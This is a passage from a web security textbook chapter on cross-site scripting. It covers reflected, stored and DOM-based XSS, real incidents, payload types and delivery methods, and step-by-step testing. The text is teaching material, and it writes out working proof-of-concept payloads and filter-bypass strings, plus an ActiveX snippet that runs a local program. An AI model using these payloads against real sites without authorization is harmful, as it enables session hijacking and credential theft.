domain‚Äôs cookies; otherwise, session hijacking would be easy. Rather, cookies 
can be accessed only by the domain that issued them. They are submitted in 
HTTP requests back to the issuing domain only, and they can be accessed via 
c12.indd 437 c12.indd 437 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 438
438 Chapter 12 n Attacking Users: Cross-Site Scripting 
JavaScript contained within or loaded by a page returned by that domain only. 
Hence, if a script residing on mdattacker.net queries document.cookie, it will 
not obtain the cookies issued by mdsec.net, and the hijacking attack will fail.
The reason why the attack that exploits the XSS vulnerability is successful is 
that, as far as the user‚Äôs browser is concerned, the attacker‚Äôs malicious JavaScript 
was sent to it by mdsec.net. When the user requests the attacker‚Äôs URL, the 
browser makes a request to http://mdsec.net/error/5/Error.ashx , and the 
application returns a page containing some JavaScript. As with any JavaScript 
received from mdsec.net, the browser executes this script within the security 
context of the user‚Äôs relationship with mdsec.net. This is why the attacker‚Äôs 
script, although it actually originates elsewhere, can gain access to the cookies issued by mdsec.net. This is also why the vulnerability itself has become 
known as cross-site scripting.
Stored XSS Vulnerabilities
A different category of XSS vulnerability is often called stored cross-site scripting. 
This version arises when data submitted by one user is stored in the application 
(typically in a back-end database) and then is displayed to other users without 
being fi ltered or sanitized appropriately.
Stored XSS vulnerabilities are common in applications that support interaction between end users, or where administrative staff access user records and 
data within the same application. For example, consider an auction application 
that allows buyers to post questions about specifi c items and sellers to post 
responses. If a user can post a question containing embedded JavaScript, and 
the application does not fi lter or sanitize this, an attacker can post a crafted 
question that causes arbitrary scripts to execute within the browser of anyone 
who views the question, including both the seller and other potential buyers. 
In this context, the attacker could potentially cause unwitting users to bid on 
an item without intending to, or cause a seller to close an auction and accept 
the attacker‚Äôs low bid for an item.
Attacks against stored XSS vulnerabilities typically involve at least two requests 
to the application. In the fi rst, the attacker posts some crafted data containing 
malicious code that the application stores. In the second, a victim views a page 
containing the attacker‚Äôs data, and the malicious code is executed when the 
script is executed in the victim‚Äôs browser. For this reason, the vulnerability is 
also sometimes called second-order cross-site scripting. (In this instance, ‚ÄúXSS‚Äù 
is really a misnomer, because the attack has no cross-site element. The name is 
widely used, however, so we will retain it here.)
Figure 12-4 illustrates how an attacker can exploit a stored XSS vulnerability 
to perform the same session hijacking attack as was described for refl ected XSS.
c12.indd 438 c12.indd 438 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 439
 Chapter 12 n Attacking Users: Cross-Site Scripting 439
Figure 12-4: The steps involved in a stored XSS attack
Application
User Attacker
5. Attacker‚Äôs
JavaScript
executes in
user‚Äôs browser 6. User‚Äôs browser sends session token to attacker
3. User views attacker‚Äôs question
4. Server responds with
attacker‚Äôs JavaScript
2. User logs in
7. Attacker hijacks user‚Äôs session
1. Attacker submits question
containing malicious JavaScript
TRY IT!
This example contains a search function that displays the query that the 
current user enters, and also a list of recent queries by other users. Because 
queries are displayed unmodifi ed, the application is vulnerable to both 
refl ected and stored XSS. See if you can fi nd both vulnerabilities.
http://mdsec.net/search/11/
Refl ected and stored XSS have two important differences in the attack process. 
Stored XSS generally is more serious from a security perspective.
First, in the case of refl ected XSS, to exploit a vulnerability, the attacker must 
induce victims to visit his crafted URL. In the case of stored XSS, this requirement is avoided. Having deployed his attack within the application, the attacker 
simply needs to wait for victims to browse to the page or function that has been 
compromised. Usually this is a regular page of the application that normal users 
will access of their own accord.
Second, the attacker‚Äôs objectives in exploiting an XSS bug are usually achieved 
much more easily if the victim is using the application at the time of the attack. 
For example, if the user has an existing session, this can be immediately hijacked. 
In a refl ected XSS attack, the attacker may try to engineer this situation by 
persuading the user to log in and then click a link that he supplies. Or he may 
attempt to deploy a persistent payload that waits until the user logs in. However, 
c12.indd 439 c12.indd 439 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 440
440 Chapter 12 n Attacking Users: Cross-Site Scripting 
in a stored XSS attack, it is usually guaranteed that victim users will already 
be accessing the application at the time the attack strikes. Because the attack 
payload is stored within a page of the application that users access of their own 
accord, any victim of the attack will by defi nition be using the application at 
the moment the payload executes. Furthermore, if the page concerned is within 
the authenticated area of the application, any victim of the attack must also be 
logged in at the time.
These differences between refl ected and stored XSS mean that stored XSS 
fl aws are often critical to an application‚Äôs security. In most cases, an attacker can 
submit some crafted data to the application and then wait for victims to be hit. 
If one of those victims is an administrator, the attacker will have compromised 
the entire application.
DOM-Based XSS Vulnerabilities
Both refl ected and stored XSS vulnerabilities involve a specifi c pattern of behavior, 
in which the application takes user-controllable data and displays this back to 
users in an unsafe way. A third category of XSS vulnerabilities does not share 
this characteristic. Here, the process by which the attacker‚Äôs JavaScript gets 
executed is as follows:
n A user requests a crafted URL supplied by the attacker and containing 
embedded JavaScript.
n The server‚Äôs response does not contain the attacker‚Äôs script in any form.
n When the user‚Äôs browser processes this response, the script is executed 
nonetheless.
How can this series of events occur? The answer is that client-side JavaScript 
can access the browser‚Äôs document object model (DOM) and therefore can determine the URL used to load the current page. A script issued by the application 
may extract data from the URL, perform some processing on this data, and then 
use it to dynamically update the page‚Äôs contents. When an application does this, 
it may be vulnerable to DOM-based XSS.
Recall the original example of a refl ected XSS fl aw, in which the server-side 
application copies data from a URL parameter into an error message. A different way of implementing the same functionality would be for the application to 
return the same piece of static HTML on every occasion and to use client-side 
JavaScript to dynamically generate the message‚Äôs contents.
For example, suppose that the error page returned by the application contains 
the following:
<script>
 var url = document.location;
c12.indd 440 c12.indd 440 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 441
 Chapter 12 n Attacking Users: Cross-Site Scripting 441
 url = unescape(url);
 var message = url.substring(url.indexOf(‚Äòmessage=‚Äô) + 8, url
.length);
 document.write(message);
</script>
This script parses the URL to extract the value of the message parameter and 
simply writes this value into the page‚Äôs HTML source code. When invoked as the 
developers intended, it can be used in the same way as in the original example 
to create error messages easily. However, if an attacker crafts a URL containing 
JavaScript code as the value of the message parameter, this code will be dynamically written into the page and executed in the same way as if the server had 
returned it. In this example, the same URL that exploited the original refl ected 
XSS vulnerability can also be used to produce a dialog box:
http://mdsec.net/error/18/Error.ashx?message=<script>alert(‚Äòxss‚Äô)</script>
TRY IT!
http://mdsec.net/error/18/
Figure 12-5 illustrates the process of exploiting a DOM-based XSS 
vulnerability.
Figure 12-5: The steps involved in a DOM-based XSS attack
Application
2. Attacker feeds crafted URL to user
User Attacker
5. Attacker‚Äôs
URL is processed
by JavaScript,
triggering his
attack payload
6. User‚Äôs browser sends session token to attacker
3. User requests attacker‚Äôs URL
4. Server responds with page
containing hard-coded JavaScript
1. User logs in
7. Attacker hijacks user‚Äôs session
c12.indd 441 c12.indd 441 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 442
442 Chapter 12 n Attacking Users: Cross-Site Scripting 
DOM-based XSS vulnerabilities are more similar to refl ected XSS bugs than 
to stored XSS bugs. Their exploitation typically involves an attacker‚Äôs inducing 
a user to access a crafted URL containing malicious code. The server‚Äôs response 
to that specifi c request causes the malicious code to be executed. However, 
in terms of the exploitation details, there are important differences between 
refl ected and DOM-based XSS, which we will examine shortly.
XSS Attacks in Action
To understand the serious impact of XSS vulnerabilities, it is fruitful to examine 
some real-world examples of XSS attacks. It also helps to consider the wide range 
of malicious actions that XSS exploits can perform and how they are actively 
being delivered to victims.
Real-World XSS Attacks
In 2010, the Apache Foundation was compromised via a refl ected XSS attack 
within its issue-tracking application. An attacker posted a link, obscured using 
a redirector service, to a URL that exploited the XSS fl aw to capture the session 
token of the logged-in user. When an administrator clicked the link, his session was compromised, and the attacker gained administrative access to the 
application. The attacker then modifi ed a project‚Äôs settings to change the upload 
folder for the project to an executable directory within the application‚Äôs web 
root. He uploaded a Trojan login form to this folder and was able to capture 
the usernames and passwords of privileged users. The attacker identifi ed some 
passwords that were being reused on other systems within the infrastructure. 
He was able to fully compromise those other systems, escalating the attack 
beyond the vulnerable web application.
For more details on this attack, see this URL:
http://blogs.apache.org/infra/entry/apache_org_04_09_2010
In 2005, the social networking site MySpace was found to be vulnerable to a 
stored XSS attack. The MySpace application implements fi lters to prevent users 
from placing JavaScript into their user profi le page. However, a user called Samy 
found a means of circumventing these fi lters and placed some JavaScript into 
his profi le page. The script executed whenever a user viewed this profi le and 
caused the victim‚Äôs browser to perform various actions with two key effects. 
First, the browser added Samy as a ‚Äúfriend‚Äù of the victim. Second, it copied the 
script into the victim‚Äôs own user profi le page. Subsequently, anyone who viewed 
the victim‚Äôs profi le would also fall victim to the attack. The result was an XSSbased worm that spread exponentially. Within hours the original perpetrator 
c12.indd 442 c12.indd 442 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 443
 Chapter 12 n Attacking Users: Cross-Site Scripting 443
had nearly one million friend requests. As a result, MySpace had to take the 
application offl ine, remove the malicious script from the profi les of all its users, 
and fi x the defect in its anti-XSS fi lters. 
For more details on this attack, see this URL:
http://namb.la/popular/tech.html
Web mail applications are inherently at risk of stored XSS attacks because 
of how they render e-mail messages in-browser when viewed by the recipient. 
E-mails may contain HTML-formatted content, so the application effectively 
copies third-party HTML into the pages it displays to users. In 2009, a web mail 
provider called StrongWebmail offered a $10,000 reward to anyone who could 
break into the CEO‚Äôs e-mail. Hackers identifi ed a stored XSS vulnerability within 
the web mail application that allowed arbitrary JavaScript to be executed when 
the recipient viewed a malicious e-mail. They sent a suitable e-mail to the CEO, 
compromised his session on the application, and claimed the reward.
For more details on this attack, see this URL:
http://blogs.zdnet.com/security/?p=3514
In 2009, Twitter fell victim to two XSS worms that exploited stored XSS vulnerabilities to spread between users and post updates promoting the website of the 
worms‚Äô author. Various DOM-based XSS vulnerabilities have also been identifi ed in Twitter, arising from its extensive use of Ajax-like code on the client side.
For more details on these vulnerabilities, see the following URLs:
www.cgisecurity.com/2009/04/two-xss-worms-slam-twitter.html
http://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-andsomething.html
Payloads for XSS Attacks
So far, we have focused on the classic XSS attack payload. It involves capturing 
a victim‚Äôs session token, hijacking her session, and thereby making use of the 
application ‚Äúas‚Äù the victim, performing arbitrary actions and potentially taking 
ownership of that user‚Äôs account. In fact, numerous other attack payloads may 
be delivered via any type of XSS vulnerability.
Virtual Defacement
This attack involves injecting malicious data into a page of a web application to 
feed misleading information to users of the application. It may simply involve 
injecting HTML markup into the site, or it may use scripts (sometimes hosted 
on an external server) to inject elaborate content and navigation into the site. 
c12.indd 443 c12.indd 443 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 444
444 Chapter 12 n Attacking Users: Cross-Site Scripting 
This kind of attack is known as virtual defacement because the actual content 
hosted on the target‚Äôs web server is not modifi ed. The defacement is generated 
solely because of how the application processes and renders user-supplied input.
In addition to frivolous mischief, this kind of attack could be used for serious criminal purposes. A professionally crafted defacement, delivered to the 
right recipients in a convincing manner, could be picked up by the news media 
and have real-world effects on people‚Äôs behavior, stock prices, and so on, to the 
attacker‚Äôs fi nancial benefi t, as illustrated in Figure 12-6.
Figure 12-6: A virtual defacement attack exploiting an XSS flaw
Injecting Trojan Functionality
This attack goes beyond virtual defacement and injects actual working functionality into the vulnerable application. The intent is to deceive end users into 
performing some undesirable action, such as entering sensitive data that is then 
transmitted to the attacker.
As was described in the attack against Apache, an obvious attack involving 
injected functionality is to present users with a Trojan login form that submits 
their credentials to a server controlled by the attacker. If skillfully executed, 
the attack may also seamlessly log in the user to the real application so that she 
does not detect any anomaly in her experience. The attacker is then free to use 
the victim‚Äôs credentials for his own purposes. This type of payload lends itself 
well to a phishing-style attack, in which users are fed a crafted URL within the 
actual authentic application and are advised that they need to log in as normal 
to access it.
Another obvious attack is to ask users to enter their credit card details, usually 
with the inducement of some attractive offer. For example, Figure 12-7 shows a 
proof-of-concept attack created by Jim Ley, exploiting a refl ected XSS vulnerability found in Google in 2004.
c12.indd 444 c12.indd 444 8/19/2011 12:12:27 PM 8/19/2011 12:12:27 PM
Stuttard c12.indd V2 - 08/10/2011 Page 445
 Chapter 12 n Attacking Users: Cross-Site Scripting 445
Figure 12-7: A reflected XSS attack injecting Trojan functionality
The URLs in these attacks point to the authentic domain name of the actual 
application, with a valid SSL certifi cate where applicable. Therefore, they are 
far more likely to persuade victims to submit sensitive information than pure 
phishing websites that are hosted on a different domain and merely clone the 
content of the targeted website.
Inducing User Actions
If an attacker hijacks a victim‚Äôs session, he can use the application ‚Äúas‚Äù that 
user and carry out any action on the user‚Äôs behalf. However, this approach to 
performing arbitrary actions may not always be desirable. It requires that the 
attacker monitor his own server for submissions of captured session tokens from 
compromised users. He also must carry out the relevant action on behalf of every 
user. If many users are being attacked, this may be impractical. Furthermore, 
it leaves a rather unsubtle trace in any application logs, which could easily be 
used to identify the computer responsible for the unauthorized actions during 
an investigation.
c12.indd 445 c12.indd 445 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 446
446 Chapter 12 n Attacking Users: Cross-Site Scripting 
An alternative to session hijacking, where an attacker simply wants to carry 
out a specifi c set of actions on behalf of each compromised user, is to use the 
attack payload script itself to perform the actions. This attack payload is particularly useful in cases where an attacker wants to perform some action that 
requires administrative privileges, such as modifying the permissions assigned 
to an account he controls. With a large user base, it would be laborious to hijack 
each user‚Äôs session and establish whether the victim was an administrator. A 
more effective approach is to induce every compromised user to attempt to 
upgrade the permissions on the attacker‚Äôs account. Most attempts will fail, but 
the moment an administrative user is compromised, the attacker succeeds in 
escalating privileges. Ways of inducing actions on behalf of other users are 
described in the ‚ÄúRequest Forgery‚Äù section of Chapter 13.
The MySpace XSS worm described earlier is an example of this attack payload. 
It illustrates the power of such an attack to perform unauthorized actions on 
behalf of a mass user base with minimal effort by the attacker. This attack used 
a complex series of requests using Ajax techniques (described in Chapter 3) to 
carry out the various actions that were required to allow the worm to propagate.
An attacker whose primary target is the application itself, but who wants 
to remain as stealthy as possible, can leverage this type of XSS attack payload 
to cause other users to carry out malicious actions of his choosing against the 
application. For example, the attacker could cause another user to exploit a SQL 
injection vulnerability to add a new administrator to the table of user accounts 
within the database. The attacker would control the new account, but any investigation of application logs may conclude that a different user was responsible.
Exploiting Any Trust Relationships
You have already seen one important trust relationship that XSS may exploit: 
browsers trust JavaScript received from a website with the cookies issued by 
that website. Several other trust relationships can sometimes be exploited in 
an XSS attack:
n If the application employs forms with autocomplete enabled, JavaScript 
issued by the application can capture any previously entered data that 
the user‚Äôs browser has stored in the autocomplete cache. By instantiating 
the relevant form, waiting for the browser to autocomplete its contents, 
and then querying the form fi eld values, the script may be able to steal 
this data and transmit it to the attacker‚Äôs server. This attack can be more 
powerful than injecting Trojan functionality, because sensitive data can 
be captured without requiring any interaction from the user.
n Some web applications recommend or require that users add their domain 
name to their browser‚Äôs ‚ÄúTrusted Sites‚Äù zone. This is almost always undesirable and means that any XSS-type fl aw can be exploited to perform 
c12.indd 446 c12.indd 446 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 447
 Chapter 12 n Attacking Users: Cross-Site Scripting 447
arbitrary code execution on the computer of a victim user. For example, 
if a site is running in the Trusted Sites zone of Internet Explorer, injecting 
the following code causes the Windows calculator program to launch on 
the user‚Äôs computer:
<script>
 var o = new ActiveXObject(‚ÄòWScript.shell‚Äô);
 o.Run(‚Äòcalc.exe‚Äô);
</script>
n Web applications often deploy ActiveX controls containing powerful 
methods (see Chapter 13). Some applications seek to prevent misuse by 
a third party by verifying within the control itself that the invoking web 
page was issued from the correct website. In this situation, the control can 
still be misused via an XSS attack, because in that instance the invoking 
code satisfi es the trust check implemented within the control.
COMMON MYTH
‚ÄúPhishing and XSS only affect applications on the public Internet.‚Äù
XSS bugs can affect any type of web application, and an attack against 
an intranet-based application, delivered via a group e-mail, can exploit two 
forms of trust. First, there is the social trust exploited by an internal e-mail 
sent between colleagues. Second, victims‚Äô browsers often trust corporate 
web servers more than they do those on the public Internet. For example, 
with Internet Explorer, if a computer is part of a corporate domain, the 
browser defaults to a lower level of security when accessing intranet-based 
applications.
Escalating the Client-Side Attack
A website may directly attack users who visit it in numerous ways, such as logging their keystrokes, capturing their browsing history, and port-scanning the 
local network. Any of these attacks may be delivered via a cross-site scripting 
fl aw in a vulnerable application, although they may also be delivered directly 
by any malicious website that a user happens to visit. Attacks of this kind are 
described in more detail at the end of Chapter 13.
Delivery Mechanisms for XSS Attacks
Having identifi ed an XSS vulnerability and formulated a suitable payload to 
exploit it, an attacker needs to fi nd some means of delivering the attack to other 
c12.indd 447 c12.indd 447 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 448
448 Chapter 12 n Attacking Users: Cross-Site Scripting 
users of the application. We have already discussed several ways in which this 
can be done. In fact, many other delivery mechanisms are available to an attacker.
Delivering Refl ected and DOM-Based XSS Attacks
In addition to the obvious phishing vector of bulk e-mailing a crafted URL to 
random users, an attacker may attempt to deliver a refl ected or DOM-based 
XSS attack via the following mechanisms:
n In a targeted attack, a forged e-mail may be sent to a single target user or 
a small number of users. For example, an application administrator could 
be sent an e-mail apparently originating from a known user, complaining that a specifi c URL is causing an error. When an attacker wants to 
compromise the session of a specifi c user (rather than harvesting those of 
random users), a well-informed and convincing targeted attack is often 
the most effective delivery mechanism. This type of attack is sometimes 
referred to as ‚Äúspear phishing‚Äù.
n A URL can be fed to a target user in an instant message.
n Content and code on third-party websites can be used to generate requests 
that trigger XSS fl aws. Numerous popular applications allow users to 
post limited HTML markup that is displayed unmodifi ed to other users. 
If an XSS vulnerability can be triggered using the GET method, an attacker 
can post an IMG tag on a third-party site targeting the vulnerable URL. 
Any user who views the third-party content will unwittingly request the 
malicious URL.
Alternatively, the attacker might create his own website containing interesting content as an inducement for users to visit. It also contains content 
that causes the user‚Äôs browser to make requests containing XSS payloads 
to a vulnerable application. If a user is logged in to the vulnerable application, and she happens to browse to the attacker‚Äôs site, the user‚Äôs session 
with the vulnerable application is compromised.
Having created a suitable website, an attacker may use search engine 
manipulation techniques to generate visits from suitable users, such as by 
placing relevant keywords within the site content and linking to the site 
using relevant expressions. This delivery mechanism has nothing to do 
with phishing, however. The attacker‚Äôs site does not attempt to impersonate the site it is targeting.
Note that this delivery mechanism can enable an attacker to exploit refl ected 
and DOM-based XSS vulnerabilities that can be triggered only via POST
requests. With these vulnerabilities, there is obviously not a simple URL 
that can be fed to a victim user to deliver an attack. However, a malicious 
c12.indd 448 c12.indd 448 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 449
 Chapter 12 n Attacking Users: Cross-Site Scripting 449
website may contain an HTML form that uses the POST method and that 
has the vulnerable application as its target URL. JavaScript or navigational 
controls on the page can be used to submit the form, successfully exploiting the vulnerability.
n In a variation on the third-party website attack, some attackers have been 
known to pay for banner advertisements that link to a URL containing 
an XSS payload for a vulnerable application. If a user is logged in to the 
vulnerable application and clicks the ad, her session with that application is compromised. Because many providers use keywords to assign 
advertisements to pages that are related to them, cases have even arisen 
where an ad attacking a particular application is assigned to the pages of 
that application itself! This not only lends credibility to the attack but also 
guarantees that someone who clicks the ad is using the vulnerable application at the moment the attack strikes. Furthermore, since the targeted 
URL is now ‚Äúon-site,‚Äù the attack can bypass browser-based mechanisms 
employed to defend against XSS (described in detail later in this chapter). Because many banner ad providers charge on a per-click basis, this 
technique effectively enables an attacker to ‚Äúbuy‚Äù a specifi c number of 
user sessions.
n Many web applications implement a function to ‚Äútell a friend‚Äù or send 
feedback to site administrators. This function often enables a user to 
generate an e-mail with arbitrary content and recipients. An attacker 
may be able to leverage this functionality to deliver an XSS attack via an 
e-mail that actually originates from the organization‚Äôs own server. This 
increases the likelihood that even technically knowledgeable users and 
anti-malware software will accept it.
Delivering Stored XSS Attacks
The two kinds of delivery mechanisms for stored XSS attacks are in-band and 
out-of-band.
In-band delivery applies in most cases and is used when the data that is 
the subject of the vulnerability is supplied to the application via its main web 
interface. Common locations where user-controllable data may eventually be 
displayed to other users include the following:
n Personal information fi elds ‚Äî name, address, e-mail, telephone, and the like
n Names of documents, uploaded fi les, and other items
n Feedback or questions for application administrators
n Messages, status updates, comments, questions, and the like for other 
application users
c12.indd 449 c12.indd 449 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 450
450 Chapter 12 n Attacking Users: Cross-Site Scripting 
n Anything that is recorded in application logs and displayed in-browser 
to administrators, such as URLs, usernames, HTTP Referer, User-Agent,
and the like
n The contents of uploaded fi les that are shared between users
In these cases, the XSS payload is delivered simply by submitting it to 
the relevant page within the application and then waiting for victims to view the 
malicious data.
Out-of-band delivery applies in cases where the data that is the subject of 
the vulnerability is supplied to the application through some other channel. 
The application receives data via this channel and ultimately renders it within 
HTML pages that are generated within its main web interface. An example 
of this delivery mechanism is the attack already described against web mail 
applications. It involves sending malicious data to an SMTP server, which is 
eventually displayed to users within an HTML-formatted e-mail message.
Chaining XSS and Other Attacks
XSS fl aws can sometimes be chained with other vulnerabilities to devastating 
effect. The authors encountered an application that had a stored XSS vulnerability within the user‚Äôs display name. The only purpose for which this item 
was used was to show a personalized welcome message after the user logged 
in. The display name was never displayed to other application users, so initially 
there appeared to be no attack vector for users to cause problems by editing 
their own display name. Other things being equal, the vulnerability would be 
classifi ed as very low risk.
However, a second vulnerability existed within the application. Defective 
access controls meant that any user could edit the display name of any other 
user. Again, on its own, this issue had minimal signifi cance: Why would an 
attacker be interested in changing the display names of other users?
Chaining together these two low-risk vulnerabilities enabled an attacker to 
completely compromise the application. It was easy to automate an attack to inject 
a script into the display name of every application user. This script executed 
every time a user logged in to the application and transmitted the user‚Äôs session token to a server owned by the attacker. Some of the application‚Äôs users 
were administrators, who logged in frequently and who could create new users 
and modify the privileges of other users. An attacker simply had to wait for an 
administrator to log in, hijack the administrator‚Äôs session, and then upgrade his 
own account to have administrative privileges. The two vulnerabilities together 
represented a critical risk to the application‚Äôs security.
In a different example, data that was presented only to the user who submitted it could be updated via a cross-site request forgery attack (see Chapter 13). 
It also contained a stored XSS vulnerability. Again, each bug when considered 
c12.indd 450 c12.indd 450 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 451
 Chapter 12 n Attacking Users: Cross-Site Scripting 451
individually might be regarded as relatively low risk; however, when exploited 
together, they can have a critical impact.
COMMON MYTH
‚ÄúWe‚Äôre not worried about that low-risk XSS bug. A user could exploit it only to 
attack himself.‚Äù
Even apparently low-risk vulnerabilities can, under the right circumstances, 
pave the way for a devastating attack. Taking a defense-in-depth approach to 
security entails removing every known vulnerability, however insignifi cant it 
may seem. The authors have even used XSS to place fi le browser dialogs or 
ActiveX controls into the page response, helping to break out of a kiosk-mode 
system bound to a target web application. Always assume that an attacker 
will be more imaginative than you in devising ways to exploit minor bugs!
Finding and Exploiting XSS Vulnerabilities
A basic approach to identifying XSS vulnerabilities is to use a standard proofof-concept attack string such as the following:
‚Äú><script>alert(document.cookie)</script>
This string is submitted as every parameter to every page of the application, 
and responses are monitored for the appearance of this same string. If cases 
are found where the attack string appears unmodifi ed within the response, the 
application is almost certainly vulnerable to XSS.
If your intention is simply to identify some instance of XSS within the application as quickly as possible to launch an attack against other application users, 
this basic approach is probably the most effective, because it can be easily automated and produces minimal false positives. However, if your objective is to 
perform a comprehensive test of the application to locate as many individual 
vulnerabilities as possible, the basic approach needs to be supplemented with 
more sophisticated techniques. There are several different ways in which XSS 
vulnerabilities may exist within an application that will not be identifi ed via 
the basic approach to detection:
n Many applications implement rudimentary blacklist-based fi lters in an 
attempt to prevent XSS attacks. These fi lters typically look for expressions 
such as <script> within request parameters and take some defensive action 
such as removing or encoding the expression or blocking the request. 
These fi lters often block the attack strings commonly employed in the 
basic approach to detection. However, just because one common attack 
c12.indd 451 c12.indd 451 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 452
452 Chapter 12 n Attacking Users: Cross-Site Scripting 
string is being fi ltered, this does not mean that an exploitable vulnerability 
does not exist. As you will see, there are cases in which a working XSS 
exploit can be created without using <script> tags and even without 
using commonly fi ltered characters such as ‚Äú<> and /.
n The anti-XSS fi lters implemented within many applications are defective 
and can be circumvented through various means. For example, suppose 
that an application strips any <script> tags from user input before it is 
processed. This means that the attack string used in the basic approach 
will not be returned in any of the application‚Äôs responses. However, it 
may be that one or more of the following strings will bypass the fi lter 
and result in a successful XSS exploit:
‚Äú><script >alert(document.cookie)</script >
‚Äú><ScRiPt>alert(document.cookie)</ScRiPt>
‚Äú%3e%3cscript%3ealert(document.cookie)%3c/script%3e
‚Äú><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00‚Äú><script>alert(document.cookie)</script>
TRY IT!
http://mdsec.net/search/28/
http://mdsec.net/search/36/
http://mdsec.net/search/21/
Note that in some of these cases, the input string may be sanitized, decoded, 
or otherwise modifi ed before being returned in the server‚Äôs response, yet might 
still be suffi cient for an XSS exploit. In this situation, no detection approach based 
on submitting a specifi c string and checking for its appearance in the server‚Äôs 
response will in itself succeed in fi nding the vulnerability.
In exploits of DOM-based XSS vulnerabilities, the attack payload is not necessarily returned in the server‚Äôs response but is retained in the browser DOM 
and accessed from there by client-side JavaScript. Again, in this situation, no 
approach based on submitting a specifi c string and checking for its appearance 
in the server‚Äôs response will succeed in fi nding the vulnerability.
Finding and Exploiting Refl ected XSS Vulnerabilities
The most reliable approach to detecting refl ected XSS vulnerabilities involves 
working systematically through all the entry points for user input that were 
identifi ed during application mapping (see Chapter 4) and following these steps:
n Submit a benign alphabetical string in each entry point.
n Identify all locations where this string is refl ected in the application‚Äôs 
response.
c12.indd 452 c12.indd 452 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 453
 Chapter 12 n Attacking Users: Cross-Site Scripting 453
n For each refl ection, identify the syntactic context in which the refl ected 
data appears.
n Submit modifi ed data tailored to the refl ection‚Äôs syntactic context, attempting to introduce arbitrary script into the response.
n If the refl ected data is blocked or sanitized, preventing your script from 
executing, try to understand and circumvent the application‚Äôs defensive 
fi lters.
Identifying Refl ections of User Input
The fi rst stage in the testing process is to submit a benign string to each entry 
point and to identify every location in the response where the string is refl ected.
HACK STEPS
 1. Choose a unique arbitrary string that does not appear anywhere within 
the application and that contains only alphabetical characters and therefore is unlikely to be affected by any XSS-specific filters. For example:
myxsstestdmqlwp
Submit this string as every parameter to every page, targeting only one
parameter at a time.
 2. Monitor the application‚Äôs responses for any appearance of this same 
string. Make a note of every parameter whose value is being copied into 
the application‚Äôs response. These are not necessarily vulnerable, but each 
instance identified is a candidate for further investigation, as described in 
the next section.
 3. Note that both GET and POST requests need to be tested. You should 
include every parameter within both the URL query string and the message body. Although a smaller range of delivery mechanisms exists for 
XSS vulnerabilities that can be triggered only by a POST request, exploitation is still possible, as previously described.
 4. In any cases where XSS was found in a POST request, use the ‚Äúchange 
request method‚Äù option in Burp to determine whether the same attack 
could be performed as a GET request.
 5. In addition to the standard request parameters, you should test every 
instance in which the application processes the contents of an HTTP 
request header. A common XSS vulnerability arises in error messages, 
where items such as the Referer and User-Agent headers are copied 
into the message‚Äôs contents. These headers are valid vehicles for delivering a reflected XSS attack, because an attacker can use a Flash object to 
induce a victim to issue a request containing arbitrary HTTP headers.
c12.indd 453 c12.indd 453 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 454
454 Chapter 12 n Attacking Users: Cross-Site Scripting 
Testing Refl ections to Introduce Script
You must manually investigate each instance of refl ected input that you have 
identifi ed to verify whether it is actually exploitable. In each location where 
data is refl ected in the response, you need to identify the syntactic context of 
that data. You must fi nd a way to modify your input such that, when it is copied 
into the same location in the application‚Äôs response, it results in execution of 
arbitrary script. Let‚Äôs look at some examples.
Example 1: A Tag Attribute Value
Suppose that the returned page contains the following:
<input type=‚Äùtext‚Äù name=‚Äùaddress1‚Äù value=‚Äùmyxsstestdmqlwp‚Äù>
One obvious way to craft an XSS exploit is to terminate the double quotation marks that enclose the attribute value, close the <input> tag, and then 
employ some means of introducing JavaScript, such as a <script> tag. For 
example:
‚Äú><script>alert(1)</script>
An alternative method in this situation, which may bypass certain input fi lters, 
is to remain within the <input> tag itself but inject an event handler containing 
JavaScript. For example:
‚Äú onfocus=‚Äùalert(1)
Example 2: A JavaScript String
Suppose that the returned page contains the following:
<script>var a = ‚Äòmyxsstestdmqlwp‚Äô; var b = 123; ... </script>
Here, the input you control is being inserted directly into a quoted string 
within an existing script. To craft an exploit, you could terminate the single 
quotation marks around your string, terminate the statement with a semicolon, 
and then proceed directly to your desired JavaScript:
‚Äò; alert(1); var foo=‚Äô
Note that because you have terminated a quoted string, to prevent errors 
from occurring within the JavaScript interpreter you must ensure that the 
script continues gracefully with valid syntax after your injected code. In this 
example, the variable foo is declared, and a second quoted string is opened. It 
will be terminated by the code that immediately follows your string. Another 
method that is often effective is to end your input with // to comment out the 
remainder of the line.
c12.indd 454 c12.indd 454 8/19/2011 12:12:28 PM 8/19/2011 12:12:28 PM
Stuttard c12.indd V2 - 08/10/2011 Page 455
 Chapter 12 n Attacking Users: Cross-Site Scripting 455
Example 3: An Attribute Containing a URL
Suppose that the returned page contains the following:
<a href=‚Äùmyxsstestdmqlwp‚Äù>Click here ...</a>
Here, the string you control is being inserted into the href attribute of an <a>
tag. In this context, and in many others in which attributes may contain URLs, 
